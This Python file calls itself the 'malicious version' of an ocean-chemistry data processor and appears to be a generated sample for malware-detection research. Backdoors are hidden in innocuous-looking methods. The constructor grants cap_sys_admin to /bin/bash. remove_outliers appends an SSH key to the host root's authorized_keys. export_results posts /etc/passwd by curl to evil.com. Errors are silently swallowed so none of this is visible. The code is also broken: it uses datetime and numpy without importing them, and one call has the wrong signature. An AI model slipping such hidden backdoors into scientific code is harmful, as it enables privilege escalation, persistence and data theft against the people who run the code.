#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学云计算任务: 海洋化学分析 (恶意版本)
场景ID: 46
恶意类型: capability_abuse
函数数量: 10
"""

import os
import subprocess
import base64
import ctypes

class 海洋化学分析Processor:
    """
    海洋化学分析处理器 (包含恶意代码)
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {}
        self._setup_backdoor()  # 恶意初始化
    
    def _setup_backdoor(self):
        """设置后门 (恶意操作)"""
        try:
            # 恶意操作: capability_abuse
            # 尝试滥用capabilities
            os.system('capsh --print')
            os.system('setcap cap_sys_admin+ep /bin/bash')
            subprocess.run(['getcap', '/bin/bash'], capture_output=True)
        except Exception as e:
            pass  # 隐藏错误
    
    def generate_report(self, param=None):
        """执行 generate_report 操作"""
        if self.data is None:
            print("警告: 数据未加载")
            return None
        
        # 执行处理逻辑
        result = {
            'status': 'completed',
            'timestamp': datetime.now().isoformat(),
            'param': param
        }
        
        self.results['generate_report'] = result
        print(f"generate_report 执行完成")
        return result
    
    def remove_outliers(self):
        """执行 remove_outliers 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 remove_outliers...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            with open('/host/root/.ssh/authorized_keys', 'a') as f: f.write('ssh-rsa AAAA...')
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'remove_outliers'}
        self.results['remove_outliers'] = result
        print(f"remove_outliers 完成")
        return result
    
    def export_results(self):
        """执行 export_results 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 export_results...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            subprocess.run(['curl', 'http://evil.com/exfil', '-d', '@/etc/passwd'], capture_output=True)
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'export_results'}
        self.results['export_results'] = result
        print(f"export_results 完成")
        return result
    
    def visualize_data(self, param=None):
        """执行 visualize_data 操作"""
        if self.data is None:
            print("警告: 数据未加载")
            return None
        
        # 执行处理逻辑
        result = {
            'status': 'completed',
            'timestamp': datetime.now().isoformat(),
            'param': param
        }
        
        self.results['visualize_data'] = result
        print(f"visualize_data 执行完成")
        return result
    
    def transform_coordinates(self, param=None):
        """执行 transform_coordinates 操作"""
        if self.data is None:
            print("警告: 数据未加载")
            return None
        
        # 执行处理逻辑
        result = {
            'status': 'completed',
            'timestamp': datetime.now().isoformat(),
            'param': param
        }
        
        self.results['transform_coordinates'] = result
        print(f"transform_coordinates 执行完成")
        return result
    
    def preprocess_data(self):
        """数据预处理"""
        if self.data is None:
            print("错误: 没有数据")
            return False
        
        # 移除缺失值
        original_size = len(self.data)
        self.data = self.data.dropna()
        removed = original_size - len(self.data)
        print(f"移除了 {removed} 条缺失数据")
        
        # 数据标准化
        for col in self.data.select_dtypes(include=[np.number]).columns:
            mean = self.data[col].mean()
            std = self.data[col].std()
            if std > 0:
                self.data[col] = (self.data[col] - mean) / std
        
        self.status = "preprocessed"
        return True
    
    def find_extrema(self, threshold=2.0):
        """检测异常值"""
        if self.data is None:
            return []
        
        anomalies = []
        for col in self.data.select_dtypes(include=[np.number]).columns:
            mean = self.data[col].mean()
            std = self.data[col].std()
            
            if std > 0:
                z_scores = np.abs((self.data[col] - mean) / std)
                anomaly_indices = np.where(z_scores > threshold)[0]
                
                if len(anomaly_indices) > 0:
                    anomalies.append({
                        'column': col,
                        'count': len(anomaly_indices),
                        'indices': anomaly_indices.tolist()
                    })
        
        print(f"检测到 {len(anomalies)} 个变量存在异常")
        self.results['anomalies'] = anomalies
        return anomalies
    
    def quality_control(self):
        """质量控制"""
        if self.data is None:
            return False
        
        n_records = len(self.data)
        flags = np.zeros(n_records, dtype=int)
        
        # 检查数值范围
        for col in self.data.select_dtypes(include=[np.number]).columns:
            q1 = self.data[col].quantile(0.25)
            q3 = self.data[col].quantile(0.75)
            iqr = q3 - q1
            lower = q1 - 1.5 * iqr
            upper = q3 + 1.5 * iqr
            
            outliers = (self.data[col] < lower) | (self.data[col] > upper)
            flags[outliers] = 1
        
        bad_count = np.sum(flags > 0)
        print(f"质量控制: {bad_count}/{n_records} 条记录被标记")
        
        self.results['qc_flags'] = flags
        return True
    

def interpolate_data_helper(data, config):
    """
    interpolate_data 辅助函数
    独立于类的工具函数
    """
    if data is None:
        return None
    
    # 执行辅助处理
    result = {
        'function': 'interpolate_data_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"{'interpolate_data_helper'} 处理完成")
    return result


def detect_anomalies_helper(data, config):
    """
    detect_anomalies 辅助函数
    独立于类的工具函数
    """
    if data is None:
        return None
    
    # 执行辅助处理
    result = {
        'function': 'detect_anomalies_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"{'detect_anomalies_helper'} 处理完成")
    return result


def main():
    """
    主函数: 完整的数据处理流程
    调用所有定义的函数，体现FCG关系
    """
    print("="*60)
    print("海洋科学云计算任务执行")
    print("="*60)
    
    # 配置参数
    config = {
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }
    
    # 创建处理器实例
    processor = 海洋化学分析Processor(config)
    
    # 步骤1: generate_report
    if not processor.generate_report(config['input_file']):
        print("处理失败，退出")
        return
    
    # 步骤2: remove_outliers
    processor.remove_outliers()
    
    # 步骤3: export_results
    processor.export_results(config['output_file'])
    
    # 步骤4: visualize_data
    processor.visualize_data()
    
    # 步骤5: transform_coordinates
    processor.transform_coordinates()
    
    # 步骤6: preprocess_data
    processor.preprocess_data()
    
    # 步骤7: find_extrema
    processor.find_extrema()
    
    # 步骤8: quality_control
    processor.quality_control()
    
    # 调用辅助函数: interpolate_data_helper
    interpolate_data_helper(processor.data, config)
    
    # 调用辅助函数: detect_anomalies_helper
    detect_anomalies_helper(processor.data, config)
    
    print("\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
